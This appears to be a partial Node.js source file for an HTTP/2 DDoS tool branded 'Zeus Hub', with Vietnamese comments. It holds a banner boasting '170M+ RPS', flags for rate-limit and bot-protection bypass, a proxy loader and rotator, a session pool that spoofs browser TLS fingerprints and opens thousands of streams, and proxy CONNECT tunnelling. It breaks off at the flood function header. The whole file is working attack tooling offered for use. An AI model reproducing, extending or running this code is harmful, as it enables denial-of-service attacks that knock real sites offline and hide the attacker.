...
// ============================================================
// ZEUS BANNER - CHỈ THÊM VÀO, KHÔNG XÓA GÌ
// ============================================================
console.log('\x1b[33m');
console.log('   ███████╗███████╗██╗   ██╗███████╗    ██╗  ██╗██╗   ██╗██████╗');
console.log('   ╚══███╔╝██╔════╝██║   ██║██╔════╝    ██║  ██║██║   ██║██╔══██╗');
...
console.log('   ╚══════╝╚══════╝ ╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝');
console.log('\x1b[0m');
console.log('\x1b[36m=== ZEUS HUB - ULTIMATE DDOS ENGINE ===\x1b[0m');
console.log('\x1b[32mMade by @ZeusHubDev\x1b[0m');
console.log('\x1b[31m170M+ RPS CAPABLE\x1b[0m');
console.log('');

// ============================================================
// HTTP2 CONSTANTS - GIỮ NGUYÊN
// ============================================================
...
const enableStatus = hasAll || hasFlag('--status');
const enableRatelimit = hasAll || hasFlag('--ratelimit');
const enableQuery = hasAll || hasFlag('--query');
const enableRedirect = hasAll || hasFlag('--redirect');
const enableFakebot = hasAll || hasFlag('--fakebot');
const enableBfm = hasAll || hasFlag('--bfm');
const enableRandPath = hasAll || hasFlag('--randpath');
const enableExploit = hasAll || hasFlag('--exploit');
...
if (cluster.isMaster) {
    ...
    if (hasAll) console.log(`[ALL]: All options enabled`);
    ...
    load(file) {
        try {
            ...
            this.proxies = data.split('\n')
                ...
                .map(l => {
                    let p = { host: '', port: 0, auth: null };
                    if (l.startsWith('http://') || l.startsWith('https://')) {
                        const u = new URL(l);
                        p.host = u.hostname;
                        p.port = parseInt(u.port) || 80;
                        p.auth = u.username ? `${u.username}:${u.password}` : null;
                    } else if (l.includes('@')) {
                        const [auth, hp] = l.split('@');
                        const [h, port] = hp.split(':');
                        p.host = h;
                        p.port = parseInt(port) || 80;
                        p.auth = auth;
                    } else {
                        const [h, port] = l.split(':');
                        p.host = h;
                        p.port = parseInt(port) || 80;
                    }
                    return p;
                });
            this.working = [...this.proxies];
            console.log('[PROXY] Loaded ' + this.proxies.length + ' proxies'.green);
        } catch(e) {
            console.log('[PROXY] No proxy file, direct mode'.yellow);
        }
    }

    getNext() {
        if (this.working.length === 0) return null;
        if (this.idx >= this.working.length) this.idx = 0;
        return this.working[this.idx++];
    }

    stats() {
        return { total: this.proxies.length, working: this.working.length };
    }
}

// ============================================================
// THÊM POOL CONNECTION ĐỂ TĂNG RPS
// ============================================================
class ZeusPool {
    constructor(target, proxyMgr) {
        this.target = target;
        this.proxyMgr = proxyMgr;
        this.sessions = [];
        this.maxSessions = 100;
        this.maxStreams = 10000;
        this.fingerprint = createRealisticClientHello(getRandomBrowser());
        this.sockOpts = {
            ...
            secureOptions: secureOptionsList.reduce((a, o) => a | o, 0),
    ...
    async getSession() {
        for (const s of this.sessions) {
            if (s && !s.destroyed && s.socket && !s.socket.destroyed) {
                return s;
            }
        }
        if (this.sessions.length < this.maxSessions) {
            const s = await this.createSession();
            if (s) { this.sessions.push(s); return s; }
        }
        if (this.sessions.length > 0) {
            const old = this.sessions.shift();
    ...
    async createSession() {
        const proxy = this.proxyMgr ? this.proxyMgr.getNext() : null;
        let socket = null;
        try {
            if (proxy) {
                socket = await this.createProxySocket(proxy);
            } else {
                socket = await this.createDirectSocket();
            }
            ...
            const session = await http2.connect(this.target.href, {
                createConnection: () => socket,
                settings: settings,
                peerMaxConcurrentStreams: this.maxStreams
            });

            session.setLocalWindowSize(15663105 * 4);
            session.on('error', () => {});
            session.on('goaway', () => {});
            session.on('close', () => {});

            const sf = createSettingsFrame(settings);
            if (socket && !socket.destroyed) socket.write(sf);
            return session;
    ...
    async createProxySocket(proxy) {
        return new Promise(resolve => {
            const s = net.connect(proxy.port, proxy.host, () => {
                let str = 'CONNECT ' + this.target.host + ':443 HTTP/1.1\r\nHost: ' + this.target.host + ':443\r\n';
                if (proxy.auth) str += 'Proxy-Authorization: Basic ' + Buffer.from(proxy.auth).toString('base64') + '\r\n';
                str += '\r\n';
                s.write(str);
            });
            s.once('data', data => {
                if (data.toString().includes('200 Connection established')) {
                    ...
                    t.once('error', () => { s.destroy(); resolve(null); });
                } else {
                    s.destroy();
                    resolve(null);
                }
    ...
    destroy() {
        for (const s of this.sessions) { try { s.destroy(); } catch(e) {} }
        this.sessions = [];
    }
}

// ============================================================
// FLOOD FUNCTION - GỐC GIỮ NGUYÊN, CHỈ THÊM PROXY VÀ POOL
// ============================================================
